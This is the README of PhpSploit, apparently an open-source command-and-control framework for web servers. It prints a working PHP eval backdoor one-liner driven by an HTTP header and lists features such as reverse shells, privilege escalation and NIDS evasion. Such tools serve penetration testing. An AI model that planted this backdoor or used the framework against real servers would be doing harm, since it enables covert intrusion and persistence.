<p align="center">
  <a href="https://github.com/nil0x42/phpsploit" alt="master">
    <img src="data/img/logo.png" alt="Master">
  </a>
</p>

<h3 align="center">
    Full-featured C2 framework which silently persists on <br>webserver via polymorphic PHP oneliner
    <a href="https://twitter.com/intent/tweet?text=PhpSploit%2C%20Full-featured%20C2%20framework%20which%20silently%20persists%20on%20webserver%20via%20polymorphic%20PHP%20oneliner%20-%20by%20@nil0x42&url=https://github.com/nil0x42/phpsploit">
      <img src="https://img.shields.io/twitter/url?label=tweet&logo=twitter&style=social&url=http%3A%2F%2F0" alt="tweet">
    </a>
</h3>
<br>

<p align="center">
  <a href="https://travis-ci.com/nil0x42/phpsploit">
    <img src="https://img.shields.io/travis/com/nil0x42/phpsploit?branch=master&logo=travis" alt="travis build">
  </a>
  <a href="https://requires.io/github/nil0x42/phpsploit/requirements/?branch=master">
    <img src="https://img.shields.io/requires/github/nil0x42/phpsploit?color=blue" alt="requires.io requirements">
  </a>
  <a href="https://app.codacy.com/app/nil0x42/phpsploit?utm_source=github.com&utm_medium=referral&utm_content=nil0x42/phpsploit&utm_campaign=Badge_Grade_Dashboard">
    <img src="https://img.shields.io/codacy/grade/b998fe23c25f40a78c6c35c722bb9fa0?logo=codacy&logoColor=green" alt="codacy code quality">
  </a>
  <a href="https://lgtm.com/projects/g/nil0x42/phpsploit/alerts/">
    <img src="https://img.shields.io/lgtm/alerts/github/nil0x42/phpsploit?logo=lgtm&logoColor=yellow" alt="lgtm alerts">
  </a>
  <a href="https://codecov.io/gh/nil0x42/phpsploit">
    <img src="https://img.shields.io/codecov/c/github/nil0x42/phpsploit?color=orange&label=coverage&logo=codecov" alt="codecov coverage">
  </a>
  <a href="https://codeclimate.com/github/nil0x42/phpsploit/maintainability">
    <img src="https://img.shields.io/codeclimate/maintainability/nil0x42/phpsploit?color=blueviolet&logo=code-climate&logoColor=blueviolet" alt="codeclimate maintainability">
  </a>
</p>

<p align="center">
  <a href="https://github.com/enaqx/awesome-pentest">
    <img src="https://awesome.re/mentioned-badge.svg">
  </a>
  <a href="https://twitter.com/intent/follow?screen_name=nil0x42" target="_blank">
    <img src="https://img.shields.io/twitter/follow/nil0x42.svg?logo=twitter">
  </a>
</p>

<div align="center">
  <sub>
    Created by
    <a href="https://twitter.com/nil0x42">nil0x42</a> and
    <a href="https://github.com/nil0x42/phpsploit#contributors">contributors</a>
  </sub>
</div>

<br>

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

<p align="center">
  <img src="data/img/demo.png">
</p>


#### Overview

The obfuscated communication is accomplished using HTTP headers under
standard client requests and web server's relative responses, tunneled
through a tiny **polymorphic backdoor**:

```php
<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
```

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Quick Start

```sh
git clone https://github.com/nil0x42/phpsploit
cd phpsploit/
pip3 install -r requirements.txt
./phpsploit --interactive --eval "help help"
```

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Features

-   **Efficient**: More than 20 plugins to automate privilege-escalation tasks
    -   Run commands and browse filesystem, bypassing PHP security restrictions
    -   Upload/Download files between client and target
    -   Edit remote files through local text editor
    -   Run SQL console on target system
    -   Spawn reverse TCP shells

-   **Stealth**: The framework is made by paranoids, for paranoids
    -   Nearly invisible by log analysis and NIDS signature detection
    -   Safe-mode and common _PHP security restrictions bypass_
    -   Communications are hidden in HTTP Headers
    -   Loaded payloads are obfuscated to _bypass NIDS_
    -   http/https/socks4/socks5 **Proxy support**

-   **Convenient**: A robust interface with many crucial features
    -   Detailed help for any option (`help` command)
    -   _Cross-platform_ on both client and server.
    -   CLI supports auto-completion & multi-command
    -   Session saving/loading feature & persistent history
    -   Multi-request support for large payloads (such as uploads)
    -   Provides a powerful, highly configurable settings engine
    -   Each setting, such as user-agent has a _polymorphic mode_
    -   Customisable environment variables for plugin interaction
    -   Provides a complete plugin development API

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Supported platforms (as attacker):

-   GNU/Linux
-   Mac OS X

#### Supported platforms (as target):

-   GNU/Linux
-   BSD-like
-   Mac OS X
-   Windows NT

## Contributors

:trophy: **Hall-of-fame**

[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/0)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/0)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/1)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/1)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/2)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/2)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/3)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/3)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/4)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/4)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/5)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/5)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/6)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/6)
[![](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/images/7)](https://sourcerer.io/fame/nil0x42/nil0x42/phpsploit/links/7)
<details>
<summary><b>All contributors</b></summary>
Thanks goes to these wonderful people:
<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tr>
    <td align="center"><a href="https://exdemia.com"><img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt=""/><br /><sub><b>nil0x42</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Code">💻</a> <a href="#infra-nil0x42" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#plugin-nil0x42" title="Plugin/utility libraries">🔌</a> <a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Tests">⚠️</a></td>
    <td align="center"><a href="https://github.com/shiney-wh"><img src="https://avatars1.githubusercontent.com/u/20907184?v=4" width="100px;" alt=""/><br /><sub><b>shiney-wh</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=shiney-wh" title="Code">💻</a> <a href="#plugin-shiney-wh" title="Plugin/utility libraries">🔌</a></td>
    <td align="center"><a href="http://wapiflapi.github.io"><img src="https://avatars3.githubusercontent.com/u/1619783?v=4" width="100px;" alt=""/><br /><sub><b>Wannes Rombouts</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=wapiflapi" title="Code">💻</a> <a href="#maintenance-wapiflapi" title="Maintenance">🚧</a></td>
    <td align="center"><a href="http://yurilz.com"><img src="https://avatars1.githubusercontent.com/u/6031769?v=4" width="100px;" alt=""/><br /><sub><b>Amine Ben Asker</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=yurilaaziz" title="Code">💻</a> <a href="#maintenance-yurilaaziz" title="Maintenance">🚧</a></td>
    <td align="center"><a href="http://twitter.com/jnazario"><img src="https://avatars1.githubusercontent.com/u/5619153?v=4" width="100px;" alt=""/><br /><sub><b>jose nazario</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=paralax" title="Documentation">📖</a> <a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Aparalax" title="Bug reports">🐛</a></td>
    <td align="center"><a href="http://wikisecure.net"><img src="https://avatars3.githubusercontent.com/u/156915?v=4" width="100px;" alt=""/><br /><sub><b>Sujit Ghosal</b></sub></a><br /><a href="#blog-sujit" title="Blogposts">📝</a></td>
    <td align="center"><a href="https://github.com/sohelzerdoumi"><img src="https://avatars3.githubusercontent.com/u/3418725?v=4" width="100px;" alt=""/><br /><sub><b>Zerdoumi</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Asohelzerdoumi" title="Bug reports">🐛</a></td>
  </tr>
  <tr>
    <td align="center"><a href="https://github.com/tristandostaler"><img src="https://avatars3.githubusercontent.com/u/5489330?v=4" width="100px;" alt=""/><br /><sub><b>tristandostaler</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Atristandostaler" title="Bug reports">🐛</a></td>
    <td align="center"><a href="https://github.com/rohantarai"><img src="https://avatars3.githubusercontent.com/u/16543074?v=4" width="100px;" alt=""/><br /><sub><b>Rohan Tarai</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Arohantarai" title="Bug reports">🐛</a></td>
    <td align="center"><a href="https://triop.se"><img src="https://avatars1.githubusercontent.com/u/190150?v=4" width="100px;" alt=""/><br /><sub><b>Jonas Lejon</b></sub></a><br /><a href="#blog-jonaslejon" title="Blogposts">📝</a></td>
  </tr>
</table>

<!-- markdownlint-enable -->
<!-- prettier-ignore-end -->
<!-- ALL-CONTRIBUTORS-LIST:END -->
This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome

</details>
